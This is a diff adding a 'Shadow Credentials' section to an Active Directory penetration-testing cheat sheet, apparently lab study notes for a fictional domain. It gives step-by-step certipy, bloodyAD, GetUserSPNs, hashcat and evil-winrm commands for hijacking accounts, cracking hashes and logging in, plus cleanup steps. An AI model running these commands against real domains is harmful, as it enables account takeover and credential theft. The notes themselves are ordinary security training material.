@@ -1457,7 +1457,68 @@ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
 # Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 ```
+##### Shadow Credentials
+```
+Method 1
+# Step 1 — Add rogue certificate to target's msDS-KeyCredentialLink
+certipy shadow auto \
+  -u mssqladm@INLANEFREIGHT.LOCAL \
+  -p 'pass!' \
+  -account aduser \
+  -dc-ip 172.16.8.3 \
+  -dc-host DC01.INLANEFREIGHT.LOCAL \
+  -ldap-scheme ldap
 
+# Step 2 — Certipy auto handles TGT + NT hash retrieval
+# Output: ttimmons.ccache + NT hash printed to screen
+
+# Step 3 — Use NT hash
+evil-winrm -u ttimmons -H <NT_HASH> -i 172.16.8.3
+
+#If you see these errors, use Method 2 instead:
+KDC_ERR_CLIENT_NAME_MISMATCH
+No identities found in this certificate
+SSL: UNEXPECTED_EOF_WHILE_READING
+#These mean PKINIT is broken on this DC (no AD CS, cert UPN mismatch, or tool version incompatibility).
+
+Method 2 — Targeted Kerberoasting (Fallback)
+bash# Step 1 — Set fake SPN on target (requires GenericWrite)
+bloodyAD -u mssqladm -p 'pass' \
+  -d INLANEFREIGHT.LOCAL \
+  --host 172.16.8.3 \
+  set object aduser servicePrincipalName \
+  -v 'fake/DEV01.INLANEFREIGHT.LOCAL'
+
+# Step 2 — Kerberoast the target user
+GetUserSPNs.py INLANEFREIGHT.LOCAL/mssqladm:'DBAilfreight1!' \
+  -dc-ip 172.16.8.3 \
+  -request-user aduser \
+  -outputfile aduser.hash
+
+# Step 3 — Crack offline
+hashcat -m 13100 aduser.hash /usr/share/wordlists/rockyou.txt --force
+
+# Step 4 — Use cleartext password
+evil-winrm -u aduser -p '<cracked_password>' -i 172.16.8.3
+
+Cleanup (Important for Reporting)
+bash# Remove fake SPN after Kerberoasting
+bloodyAD -u mssqladm -p 'password' \
+  -d INLANEFREIGHT.LOCAL \
+  --host 172.16.8.3 \
+  set object aduser servicePrincipalName \
+  -v ''
+
+# Verify SPN removed
+GetUserSPNs.py INLANEFREIGHT.LOCAL/mssqladm:'password' \
+  -dc-ip 172.16.8.3 | grep aduser
+# Should return nothing
+
+# If shadow creds were added and not auto-cleaned
+python3 pywhisker.py -d INLANEFREIGHT.LOCAL -u mssqladm \
+  -p 'password' --target aduser --action clear
+
+```
 ##### Trust Relationships Child Parent Trusts
 ```
 # PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
